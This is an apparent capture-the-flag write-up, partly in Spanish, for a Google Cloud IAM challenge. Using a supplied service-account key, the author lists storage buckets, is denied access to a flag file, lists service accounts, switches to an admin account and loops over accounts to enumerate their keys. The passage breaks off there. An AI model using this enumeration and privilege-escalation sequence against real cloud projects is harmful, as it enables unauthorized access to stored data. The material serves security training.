
# Cloud Storage [Misc]

 150

Have you heard about this "cloud" thing that everyone is using? I think we can save a bunch of money by putting our cat photos there!

I have provided a service account key that you can use to authenticate and check that you can access the photos.

That service account shouldn't have access to anything other than the cat pictures, but this whole "eye aye em" thing is a bit confusing, so I'm not entirely sure!

We can't afford to have another data breach, so we need to be confident that our flags are secure before we make the switch.

## Solve


```
gcloud auth activate-service-account --key-file=lateral-replica-423406-n3-f892e5bfb33b.json
Activated service account credentials for: [user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com]
```

```
 gcloud auth list
                            Credentialed Accounts
ACTIVE  ACCOUNT
*       user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com

To set the active account, run:
    $ gcloud config set account `ACCOUNT`
```


```
 gcloud config set account user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
Updated property [core/account].
```

```
 gcloud config set project lateral-replica-423406-n3
WARNING: [user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com] does not have permission to access projects instance [lateral-replica-423406-n3] (or it may not exist): Cloud Resource Manager API has not been used in project 726740957047 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/cloudresourcemanager.googleapis.com/overview?project=726740957047 then retry. If you enabled this API recently, wait a few minutes for the action to propagate to our systems and retry. This command is authenticated as user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com which is the active account specified by the [core/account] property.
- '@type': type.googleapis.com/google.rpc.Help
  links:
  - description: Google developers console API activation
    url: https://console.developers.google.com/apis/api/cloudresourcemanager.googleapis.com/overview?project=726740957047
- '@type': type.googleapis.com/google.rpc.ErrorInfo
  domain: googleapis.com
  metadata:
    consumer: projects/726740957047
    service: cloudresourcemanager.googleapis.com
  reason: SERVICE_DISABLED
Are you sure you wish to set property [core/project] to lateral-replica-423406-n3?

Do you want to continue (Y/n)?  y

Updated property [core/project].
```

```
 gcloud storage ls
gs://uscg-2024-bgr-cat-pictures/
gs://uscg-2024-bgr-flags/
```

```
 gcloud storage ls --recursive gs://uscg-2024-bgr-flags
gs://uscg-2024-bgr-flags/:
gs://uscg-2024-bgr-flags/flag.txt
```

- error al acceder, no se tienen permisos
```
gcloud storage cp gs://uscg-2024-bgr-flags/flag.txt 
gcloud storage cat gs://uscg-2024-bgr-flags/flag.txt
```

```
gcloud iam service-accounts list
DISPLAY NAME           EMAIL                                                                    DISABLED
admin-service-account  admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com  False
user-service-account   user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com   False
```

```
gcloud config set account admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
Updated property [core/account].
```

Try
```
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
    echo "Looking for keys for $i:"
    gcloud iam service-accounts keys list --iam-account $i
done
```

